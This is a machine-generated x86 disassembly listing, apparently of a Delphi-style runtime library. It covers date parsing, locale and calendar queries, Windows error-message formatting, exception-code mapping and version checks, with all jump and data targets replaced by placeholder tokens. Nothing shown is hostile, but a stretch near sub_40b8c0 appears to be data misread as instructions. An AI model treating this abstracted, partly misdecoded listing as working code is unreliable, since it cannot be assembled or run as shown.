add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a66c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a66c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a66c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a5d8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a5b4
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a66c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6f8
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a5d8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a66c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6f8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a5b4
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409654
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a66c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a5d8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a66c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a6f8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a66c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a5d8
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40adac
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a874
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404210
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ade0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40abb8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404210
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ae14
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a874
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ade0
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404210
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40abb8
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aea0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404040
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aeec
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fa4
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404040
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40af38
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40af60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aeec
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405c80
sub_40af9c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b0af
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40af60
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fa4
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40af60
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fa4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40af60
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fa4
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40af60
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fa4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b0b6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f74
retn
sub_40b0c0
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404148
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b0fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b161
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404148
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4081f8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b168
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
inc ebx
sub_40b174
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b20b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aeec
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4081f8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b212
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b0c0
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b0fc
call EnumCalendarInfoA
sub_40b224
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b3ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f50
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aeec
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4081f8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404210
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3f5
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f74
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408858
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c294
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404470
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404218
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fa4
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408858
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404218
inc ebx
jmp r-xdata
mov eax esi
call sub_404210
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408858
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404218
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404218
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404218
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404138
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404218
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404138
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404218
sub_40b458
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b44c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c458
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40877c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051ec
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030a4
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408db4
mov eax [ ebp - 0x4 ]
call sub_408718
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404410
mov ebx eax
mov eax ebx
call sub_408718
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b5e0
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b458
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051ec
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029ac
call sub_402844
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408718
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b6a8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fa4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b6e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b73e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408df4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b745
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
add esp 0xfffffff0
call sub_4034a0
sub_40b745
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b764
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405c80
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b80c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405c80
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408df4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b813
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
add esp 0xfffffff0
call sub_4034a0
sub_40b813
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b860
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028b8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b8c0
les edi [ eax + 0xa0e0040 ]
push esp
inc ebp
js r-xdata
jg r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b9d0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403fe8
jmp r-xdata
push ebx
mov eax edx
jmp sub_403908
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9d7
lea eax [ ebp - 0x20 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b6a8
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b860
mov edx eax
sub_40b934
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b9d0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403fe8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9d7
lea eax [ ebp - 0x20 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40ba24
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40babc
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bc77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041c0
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408630
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc7e
lea eax [ ebp - 0x170 ]
call sub_403f50
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40bc88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bd43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ba24
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b6a8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push ebp
call sub_40babc
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd4a
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
mov ebx eax
sub_40bd64
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bd54
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40baa4
mov eax [ rw-data ]
mov [ eax ] sub_40bc88
mov eax sub_40b9f0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ba0c
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bde8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403154
xor eax eax
mov [ rw-data ] eax
sub_40be68
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041c0
sub_40bef8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bfce
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
